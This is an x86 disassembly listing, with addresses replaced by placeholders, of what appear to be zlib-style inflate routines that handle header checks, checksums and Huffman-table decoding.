call sub_3ae73e0
mov ecx [ ebx + 0x1c ]
test eax eax
mov [ ecx + 0x14 ] eax
jne r-xdata
sub_3ae6e4c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
jne r-xdata
cmp edi 0x4
jne r-xdata
xor edx edx
mov edx 0xfffffffb
jmp r-xdata
mov eax 0xfffffffe
jmp [ edx * 4 + jump_table_3ae6e97 ]
mov edi edx
mov esi 0xfffffffb
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov edx [ ebx + 0x1c ]
mov [ edx ] 0xd
mov [ ebx + 0x18 ] rw-data
mov ecx [ ebx + 0x1c ]
xor eax eax
mov [ ecx + 0x4 ] eax
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ edx + 0x14 ]
mov ecx esi
mov edx ebx
call sub_3ae7478
mov esi eax
cmp esi 0xfffffffd
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0xfffffffd
jmp r-xdata
mov esi edi
dec [ ebx + 0x4 ]
inc [ ebx + 0x8 ]
mov edx [ ebx ]
inc [ ebx ]
mov cl [ edx ]
xor edx edx
mov dl cl
mov eax [ ebx + 0x1c ]
mov [ eax + 0x4 ] edx
and edx 0xf
cmp edx 0x8
je r-xdata
mov eax esi
jmp r-xdata
dec [ ebx + 0x4 ]
inc [ ebx + 0x8 ]
xor edx edx
mov eax [ ebx ]
mov esi edi
inc [ ebx ]
mov ebp [ ebx + 0x1c ]
mov cl [ eax ]
and ecx 0xff
mov eax [ ebp + 0x4 ]
shl eax 0x8
push ecx
add eax ecx
mov ecx 0x1f
div ecx
pop ecx
test edx edx
je r-xdata
mov eax esi
jmp r-xdata
mov esi edi
dec [ ebx + 0x4 ]
inc [ ebx + 0x8 ]
mov edx [ ebx ]
inc [ ebx ]
mov cl [ edx ]
xor edx edx
mov dl cl
shl edx 0x18
mov eax [ ebx + 0x1c ]
mov [ eax + 0x8 ] edx
mov [ eax ] 0x3
mov eax esi
jmp r-xdata
dec [ ebx + 0x4 ]
inc [ ebx + 0x8 ]
xor ecx ecx
mov eax [ ebx ]
mov esi edi
inc [ ebx ]
mov dl [ eax ]
mov eax [ ebx + 0x1c ]
mov cl dl
shl ecx 0x10
add [ eax + 0x8 ] ecx
mov edx [ ebx + 0x1c ]
mov [ edx ] 0x4
mov eax esi
jmp r-xdata
dec [ ebx + 0x4 ]
inc [ ebx + 0x8 ]
xor ecx ecx
mov eax [ ebx ]
mov esi edi
inc [ ebx ]
mov dl [ eax ]
mov eax [ ebx + 0x1c ]
mov cl dl
shl ecx 0x8
add [ eax + 0x8 ] ecx
mov edx [ ebx + 0x1c ]
mov [ edx ] 0x5
mov eax esi
jmp r-xdata
dec [ ebx + 0x4 ]
inc [ ebx + 0x8 ]
xor eax eax
mov edx [ ebx ]
inc [ ebx ]
mov cl [ edx ]
mov edx [ ebx + 0x1c ]
mov al cl
add [ edx + 0x8 ] eax
mov ecx [ ebx + 0x1c ]
mov eax [ ecx + 0x8 ]
mov [ ebx + 0x30 ] eax
mov eax 0x2
mov edx [ ebx + 0x1c ]
mov [ edx ] 0x6
jmp r-xdata
mov eax esi
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ ebx + 0x1c ]
mov [ eax ] 0xd
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov esi edi
dec [ ebx + 0x4 ]
inc [ ebx + 0x8 ]
mov edx [ ebx ]
inc [ ebx ]
mov cl [ edx ]
xor edx edx
mov dl cl
shl edx 0x18
mov eax [ ebx + 0x1c ]
mov [ eax + 0x8 ] edx
mov [ eax ] 0x9
mov eax esi
jmp r-xdata
dec [ ebx + 0x4 ]
inc [ ebx + 0x8 ]
xor ecx ecx
mov eax [ ebx ]
mov esi edi
inc [ ebx ]
mov dl [ eax ]
mov eax [ ebx + 0x1c ]
mov cl dl
shl ecx 0x10
add [ eax + 0x8 ] ecx
mov edx [ ebx + 0x1c ]
mov [ edx ] 0xa
mov eax esi
jmp r-xdata
dec [ ebx + 0x4 ]
inc [ ebx + 0x8 ]
xor ecx ecx
mov eax [ ebx ]
mov esi edi
inc [ ebx ]
mov dl [ eax ]
mov eax [ ebx + 0x1c ]
mov cl dl
shl ecx 0x8
add [ eax + 0x8 ] ecx
mov edx [ ebx + 0x1c ]
mov [ edx ] 0xb
mov eax esi
jmp r-xdata
dec [ ebx + 0x4 ]
inc [ ebx + 0x8 ]
xor ecx ecx
mov eax [ ebx ]
mov esi edi
inc [ ebx ]
mov dl [ eax ]
mov eax [ ebx + 0x1c ]
mov cl dl
add [ eax + 0x8 ] ecx
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x4 ]
cmp edx [ eax + 0x8 ]
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x4 ]
shr edx 0x4
add edx 0x8
cmp edx [ eax + 0x10 ]
jbe r-xdata
mov [ eax ] 0xd
mov [ ebx + 0x18 ] rw-data
mov eax [ ebx + 0x1c ]
mov [ eax + 0x4 ] 0x5
jmp r-xdata
test cl 0x20
jne r-xdata
mov [ ebp ] 0xd
mov [ ebx + 0x18 ] rw-data
mov ecx [ ebx + 0x1c ]
mov [ ecx + 0x4 ] 0x5
jmp r-xdata
cmp esi 0x1
je r-xdata
mov esi edi
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
cmp edx 0xd
ja r-xdata
mov eax [ ebx + 0x1c ]
mov [ eax ] 0xc
mov [ eax ] 0xd
mov [ ebx + 0x18 ] rw-data
mov ecx [ ebx + 0x1c ]
mov [ ecx + 0x4 ] 0x5
jmp r-xdata
mov eax [ ebx + 0x1c ]
mov [ eax ] 0x1
mov [ eax ] 0xd
mov [ ebx + 0x18 ] rw-data
mov ecx [ ebx + 0x1c ]
mov [ ecx + 0x4 ] 0x5
jmp r-xdata
mov edx [ ebx + 0x1c ]
mov [ edx ] 0x2
mov eax [ ebx + 0x1c ]
mov [ eax ] 0x7
jmp r-xdata
mov esi edi
mov eax [ ebx + 0x1c ]
mov ecx eax
add ecx 0x4
mov eax [ eax + 0x14 ]
mov edx ebx
call sub_3ae737c
mov eax [ ebx + 0x1c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov edx [ ebx + 0x1c ]
mov [ edx ] 0x8
mov [ eax ] 0xc
jmp r-xdata
sub_3ae721c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov esi ebp
test ebx ebx
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp [ eax ] 0x6
je r-xdata
mov ecx ebp
mov edx edi
mov eax 0x1
call sub_3aeb5d4
cmp eax [ ebx + 0x30 ]
je r-xdata
mov [ ebx + 0x30 ] 0x1
mov eax [ ebx + 0x1c ]
mov ecx [ eax + 0x10 ]
mov edx 0x1
shl edx cl
cmp esi edx
jb r-xdata
mov eax 0xfffffffd
jmp r-xdata
mov eax [ eax + 0x14 ]
mov ecx esi
mov edx edi
call sub_3ae8180
mov eax [ ebx + 0x1c ]
mov [ eax ] 0x7
xor eax eax
mov edx [ ebx + 0x1c ]
mov ecx [ edx + 0x10 ]
mov esi 0x1
shl esi cl
dec esi
sub ebp esi
add edi ebp
sub_3ae72a4
push ebx
push esi
push edi
mov ebx eax
test ebx ebx
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp [ eax ] 0xd
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
jne r-xdata
mov [ eax ] 0xd
xor edx edx
mov [ eax + 0x4 ] edx
mov edi [ ebx ]
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax 0xfffffffb
jmp r-xdata
test esi esi
je r-xdata
mov ecx edi
sub ecx [ ebx ]
add [ ebx + 0x8 ] ecx
mov [ ebx ] edi
mov [ ebx + 0x4 ] esi
cmp eax 0x4
mov edx [ ebx + 0x1c ]
mov [ edx + 0x4 ] eax
je r-xdata
cmp eax 0x4
jb r-xdata
mov esi [ ebx + 0x8 ]
mov edi [ ebx + 0x14 ]
mov eax ebx
call sub_3ae6cac
mov [ ebx + 0x8 ] esi
mov [ ebx + 0x14 ] edi
mov edx [ ebx + 0x1c ]
xor eax eax
mov [ edx ] 0x7
mov eax 0xfffffffd
jmp r-xdata
mov dl [ edi ]
cmp dl [ eax + rw-data ]
jne r-xdata
test dl dl
je r-xdata
inc eax
jmp r-xdata
mov edx 0x4
sub edx eax
mov eax edx
xor eax eax
jmp r-xdata
inc edi
dec esi
sub_3ae7354
test eax eax
je r-xdata
mov eax 0xfffffffe
retn
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov edx [ eax + 0x1c ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov ecx [ eax + 0x1c ]
mov eax [ ecx + 0x14 ]
call sub_3ae81a4
retn
sub_3ae737c
push ebx
push esi
mov esi edx
mov ebx eax
test ecx ecx
je r-xdata
mov eax [ ebx ]
cmp eax 0x4
je r-xdata
mov eax [ ebx + 0x3c ]
mov [ ecx ] eax
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
cmp eax 0x5
jne r-xdata
xor edx edx
xor ecx ecx
mov [ ebx ] edx
xor eax eax
mov [ ebx + 0x1c ] ecx
mov [ ebx + 0x20 ] eax
mov edx [ ebx + 0x28 ]
mov [ ebx + 0x34 ] edx
mov [ ebx + 0x30 ] edx
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_3ae919c
cmp [ ebx ] 0x6
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
xor eax eax
call [ ebx + 0x38 ]
mov [ ebx + 0x3c ] eax
mov [ esi + 0x30 ] eax
sub_3ae73e0
push ebx
push esi
push edi
mov esi eax
push ecx
mov [ esp ] edx
mov edi ecx
mov ecx 0x40
mov edx 0x1
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov ebx eax
test eax eax
jne r-xdata
mov ecx 0x5a0
mov edx 0x8
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x24 ] eax
test eax eax
jne r-xdata
mov eax ebx
jmp r-xdata
mov ecx edi
mov edx 0x1
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x28 ] eax
test eax eax
jne r-xdata
mov edx ebx
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
xor eax eax
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x28 ]
xor eax eax
add edx edi
mov [ ebx + 0x2c ] edx
mov edx esi
mov ecx [ esp ]
mov [ ebx + 0x38 ] ecx
mov [ ebx ] eax
mov eax ebx
xor ecx ecx
call sub_3ae737c
mov eax ebx
mov edx [ ebx + 0x24 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
mov edx ebx
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
xor eax eax
jmp r-xdata
sub_3ae7478
push ebx
push esi
push edi
push ebp
add esp 0xffffffc4
mov esi edx
mov ebx eax
mov [ esp ] ecx
mov eax [ esi ]
mov [ esp + 0xc ] eax
mov edx [ esi + 0x4 ]
mov [ esp + 0x10 ] edx
mov ecx [ ebx + 0x20 ]
mov [ esp + 0x8 ] ecx
mov edi [ ebx + 0x1c ]
mov eax [ ebx + 0x34 ]
mov [ esp + 0x14 ] eax
mov edx [ esp + 0x14 ]
cmp edx [ ebx + 0x30 ]
jae r-xdata
mov ebp [ ebx + 0x2c ]
sub ebp [ esp + 0x14 ]
mov ebp [ ebx + 0x30 ]
sub ebp [ esp + 0x14 ]
dec ebp
jmp r-xdata
mov [ esp ] 0xfffffffe
mov ecx [ esp + 0x8 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] edi
mov eax [ esp + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0xc ]
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov edx esi
mov ecx [ esp + 0xc ]
mov [ esi ] ecx
mov eax [ esp + 0x14 ]
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp [ eax * 4 + jump_table_3ae74d0 ]
mov eax [ ebx ]
cmp eax 0x9
ja r-xdata
cmp edi 0x3
jae r-xdata
cmp edi 0x20
jae r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
cmp edi 0xe
jae r-xdata
mov eax [ ebx + 0x4 ]
shr eax 0xa
add eax 0x4
cmp eax [ ebx + 0x8 ]
ja r-xdata
mov eax [ ebx + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
shr eax 0x5
and edx 0x1f
and eax 0x1f
add edx eax
add edx 0x102
cmp edx [ ebx + 0x8 ]
ja r-xdata
mov ecx [ esp + 0x8 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] edi
mov eax [ esp + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0xc ]
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov edx esi
mov ecx [ esp + 0xc ]
mov [ esi ] ecx
mov eax [ esp + 0x14 ]
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae8900
mov [ esp ] eax
dec eax
je r-xdata
mov edx [ esp + 0x14 ]
mov eax ebx
mov [ ebx + 0x34 ] edx
mov edx esi
mov ecx [ esp ]
call sub_3ae91a8
mov [ esp ] eax
mov ecx [ ebx + 0x34 ]
mov [ esp + 0x14 ] ecx
mov eax [ esp + 0x14 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
mov [ esp ] 0x1
mov edx [ esp + 0x8 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] edi
mov ecx [ esp + 0x10 ]
mov [ esi + 0x4 ] ecx
mov eax [ esp + 0xc ]
sub eax [ esi ]
add [ esi + 0x8 ] eax
mov eax ebx
mov edx [ esp + 0xc ]
mov [ esi ] edx
mov edx esi
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x34 ] ecx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov [ esp ] 0xfffffffd
mov eax [ esp + 0x8 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] edi
mov edx [ esp + 0x10 ]
mov [ esi + 0x4 ] edx
mov ecx [ esp + 0xc ]
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov eax [ esp + 0xc ]
mov [ esi ] eax
mov eax ebx
mov edx [ esp + 0x14 ]
mov [ ebx + 0x34 ] edx
mov edx esi
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov ecx [ esp + 0x8 ]
and ecx 0x7
mov [ esp + 0x4 ] ecx
mov eax [ esp + 0x4 ]
and eax 0x1
mov [ ebx + 0x18 ] eax
mov edx [ esp + 0x4 ]
shr edx 0x1
sub edx 0x1
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
not edx
shr edx 0x10
and eax 0xffff
and edx 0xffff
cmp eax edx
je r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
test ebp ebp
jne r-xdata
mov edx [ esp + 0x8 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] edi
mov ecx [ esp + 0x10 ]
mov [ esi + 0x4 ] ecx
mov eax [ esp + 0xc ]
sub eax [ esi ]
add [ esi + 0x8 ] eax
mov eax ebx
mov edx [ esp + 0xc ]
mov [ esi ] edx
mov edx esi
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x34 ] ecx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov ecx [ esp + 0x8 ]
and ecx 0x3fff
mov [ esp + 0x4 ] ecx
mov [ ebx + 0x4 ] ecx
mov eax [ esp + 0x4 ]
and eax 0x1f
cmp eax 0x1d
ja r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp edi 0x3
jae r-xdata
jmp r-xdata
mov edx [ ebx + 0x10 ]
mov [ esp + 0x4 ] edx
cmp edi [ esp + 0x4 ]
jae r-xdata
xor edx edx
mov [ ebx + 0x14 ] edx
mov [ esp + 0x2c ] 0x9
mov [ esp + 0x30 ] 0x6
mov ecx [ ebx + 0x4 ]
lea eax [ esp + 0x2c ]
mov [ esp + 0x4 ] ecx
push eax
lea edx [ esp + 0x34 ]
push edx
lea ecx [ esp + 0x3c ]
push ecx
lea eax [ esp + 0x44 ]
push eax
mov edx [ ebx + 0x24 ]
push edx
push esi
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
shr edx 0x5
and eax 0x1f
and edx 0x1f
mov ecx [ ebx + 0xc ]
inc edx
add eax 0x101
call sub_3ae8744
mov [ esp + 0x4 ] eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_3ae919c
mov ecx [ esi ]
mov [ esp + 0xc ] ecx
mov eax [ esi + 0x4 ]
mov [ esp + 0x10 ] eax
mov edx [ ebx + 0x20 ]
mov [ esp + 0x8 ] edx
mov edi [ ebx + 0x1c ]
mov eax [ ebx + 0x34 ]
mov [ esp + 0x14 ] eax
mov edx [ esp + 0x14 ]
cmp edx [ ebx + 0x30 ]
jae r-xdata
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3ae91a8
jmp r-xdata
mov edx [ ebx + 0x2c ]
sub edx [ esp + 0x14 ]
mov edx [ ebx + 0x30 ]
sub edx [ esp + 0x14 ]
dec edx
jmp r-xdata
add esp 0x3c
pop ebp
pop edi
pop esi
pop ebx
retn
shr [ esp + 0x8 ] 0x3
sub edi 0x3
mov ecx edi
and ecx 0x7
mov [ esp + 0x4 ] ecx
mov ecx [ esp + 0x4 ]
shr [ esp + 0x8 ] cl
sub edi [ esp + 0x4 ]
mov [ ebx ] 0x1
jmp r-xdata
je r-xdata
mov ecx [ esp + 0x8 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] edi
mov eax [ esp + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0xc ]
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov edx esi
mov ecx [ esp + 0xc ]
mov [ esi ] ecx
mov eax [ esp + 0x14 ]
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
xor edx edx
mov [ esp ] edx
jmp r-xdata
mov edx eax
mov [ ebx + 0x4 ] edx
xor ecx ecx
mov edi ecx
mov [ esp + 0x8 ] ecx
test edx edx
je r-xdata
mov [ ebx ] 0x9
mov [ esi + 0x18 ] rw-data
mov [ esp ] 0xfffffffd
mov ecx [ esp + 0x8 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] edi
mov eax [ esp + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0xc ]
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov edx esi
mov ecx [ esp + 0xc ]
mov [ esi ] ecx
mov eax [ esp + 0x14 ]
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] edi
mov edx [ esp + 0x10 ]
mov [ esi + 0x4 ] edx
mov ecx [ esp + 0xc ]
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov eax [ esp + 0xc ]
mov [ esi ] eax
mov eax ebx
mov edx [ esp + 0x14 ]
mov [ ebx + 0x34 ] edx
mov edx esi
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
xor ecx ecx
mov [ esp ] ecx
jmp r-xdata
xor ecx ecx
mov [ esp ] ecx
mov eax [ ebx + 0x4 ]
mov [ esp + 0x4 ] eax
mov edx [ esp + 0x4 ]
cmp edx [ esp + 0x10 ]
jbe r-xdata
mov eax [ esp + 0x14 ]
cmp eax [ ebx + 0x2c ]
jne r-xdata
mov [ ebx ] 0x9
mov [ esi + 0x18 ] rw-data
mov [ esp ] 0xfffffffd
mov eax [ esp + 0x8 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] edi
mov edx [ esp + 0x10 ]
mov [ esi + 0x4 ] edx
mov ecx [ esp + 0xc ]
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov eax [ esp + 0xc ]
mov [ esi ] eax
mov eax ebx
mov edx [ esp + 0x14 ]
mov [ ebx + 0x34 ] edx
mov edx esi
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov edx [ esp + 0x4 ]
shr edx 0x5
and edx 0x1f
cmp edx 0x1d
jbe r-xdata
mov ecx [ esp + 0x8 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] edi
mov eax [ esp + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0xc ]
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov edx esi
mov ecx [ esp + 0xc ]
mov [ esi ] ecx
mov eax [ esp + 0x14 ]
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
xor edx edx
mov [ esp ] edx
jmp r-xdata
mov ecx [ ebx + 0x8 ]
inc [ ebx + 0x8 ]
mov eax [ ecx * 4 + rw-data ]
mov edx [ ebx + 0xc ]
mov ecx [ esp + 0x8 ]
and ecx 0x7
mov [ edx + eax * 4 ] ecx
shr [ esp + 0x8 ] 0x3
sub edi 0x3
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x13
jb r-xdata
mov edx [ esp + 0x4 ]
mov eax [ edx * 4 + rw-data ]
and eax [ esp + 0x8 ]
shl eax 0x3
add eax [ ebx + 0x14 ]
xor edx edx
mov dl [ eax + 0x1 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x4 ]
cmp edx 0x10
jae r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov ecx [ esp + 0x38 ]
push ecx
push esi
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x34 ]
call sub_3ae88b0
mov ebp eax
test eax eax
jne r-xdata
cmp [ esp + 0x4 ] 0xfffffffd
jne r-xdata
mov ebp [ ebx + 0x2c ]
sub ebp [ esp + 0x14 ]
mov ebp [ ebx + 0x30 ]
sub ebp [ esp + 0x14 ]
dec ebp
jmp r-xdata
mov [ ebx ] 0x8
mov ecx [ esp + 0x8 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] edi
mov eax [ esp + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0xc ]
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov edx esi
mov ecx [ esp + 0xc ]
mov [ esi ] ecx
mov eax [ esp + 0x14 ]
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
lea eax [ esp + 0x24 ]
push eax
push esi
lea ecx [ esp + 0x28 ]
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x20 ]
call sub_3ae8884
mov eax [ esp + 0x24 ]
push eax
push esi
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
call sub_3ae88b0
mov [ ebx + 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
dec edx
je r-xdata
mov ecx edi
dec [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov al [ edx ]
xor edx edx
mov dl al
shl edx cl
or [ esp + 0x8 ] edx
inc [ esp + 0xc ]
add edi 0x8
cmp edi 0x3
jb r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
mov ecx edi
dec [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov dl [ eax ]
xor eax eax
mov al dl
shl eax cl
or [ esp + 0x8 ] eax
inc [ esp + 0xc ]
add edi 0x8
cmp edi 0x20
jb r-xdata
cmp ebp [ esp + 0x4 ]
jae r-xdata
mov ecx [ esp + 0x10 ]
mov [ esp + 0x4 ] ecx
test ebp ebp
jne r-xdata
mov edx [ ebx + 0x30 ]
cmp edx [ ebx + 0x28 ]
je r-xdata
mov ecx [ esp + 0x4 ]
shr ecx 0x5
and ecx 0x1f
add eax ecx
add eax 0x102
mov [ esp + 0x4 ] eax
mov ecx 0x4
mov edx [ esp + 0x4 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0xc ] eax
test eax eax
jne r-xdata
mov ecx edi
dec [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov al [ edx ]
xor edx edx
mov dl al
shl edx cl
or [ esp + 0x8 ] edx
inc [ esp + 0xc ]
add edi 0x8
cmp edi 0xe
jb r-xdata
mov ecx [ esp + 0x8 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] edi
mov eax [ esp + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0xc ]
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov edx esi
mov ecx [ esp + 0xc ]
mov [ esi ] ecx
mov eax [ esp + 0x14 ]
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
xor edx edx
mov [ esp ] edx
jmp r-xdata
mov edx [ ebx + 0x8 ]
inc [ ebx + 0x8 ]
mov ecx [ edx * 4 + rw-data ]
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + ecx * 4 ] edx
mov [ ebx + 0x10 ] 0x7
mov ecx [ ebx + 0x24 ]
push ecx
push esi
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebx + 0xc ]
call sub_3ae86a8
mov [ esp + 0x4 ] eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edx 0x12
jne r-xdata
mov ecx [ esp + 0x4 ]
shr [ esp + 0x8 ] cl
sub edi [ esp + 0x4 ]
mov eax [ ebx + 0x8 ]
inc [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] edi
mov edx [ esp + 0x10 ]
mov [ esi + 0x4 ] edx
mov ecx [ esp + 0xc ]
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov eax [ esp + 0xc ]
mov [ esi ] eax
mov eax ebx
mov edx [ esp + 0x14 ]
mov [ ebx + 0x34 ] edx
mov edx esi
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
xor ecx ecx
mov [ esp ] ecx
jmp r-xdata
mov [ ebx + 0x4 ] ebp
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
mov [ ebx ] 0x6
mov [ esp ] 0xfffffffc
mov edx [ esp + 0x8 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] edi
mov ecx [ esp + 0x10 ]
mov [ esi + 0x4 ] ecx
mov eax [ esp + 0xc ]
sub eax [ esi ]
add [ esi + 0x8 ] eax
mov eax ebx
mov edx [ esp + 0xc ]
mov [ esi ] edx
mov edx esi
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x34 ] ecx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov [ esp ] ecx
mov eax [ esp + 0x8 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] edi
mov edx [ esp + 0x10 ]
mov [ esi + 0x4 ] edx
mov ecx [ esp + 0xc ]
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov eax [ esp + 0xc ]
mov [ esi ] eax
mov eax ebx
mov edx [ esp + 0x14 ]
mov [ ebx + 0x34 ] edx
mov edx esi
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
mov [ ebx ] 0x9
mov [ ebx ] 0x7
xor eax eax
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
shr [ esp + 0x8 ] 0x3
sub edi 0x3
mov [ ebx ] 0x6
jmp r-xdata
mov [ esp ] 0xfffffffc
mov edx [ esp + 0x8 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] edi
mov ecx [ esp + 0x10 ]
mov [ esi + 0x4 ] ecx
mov eax [ esp + 0xc ]
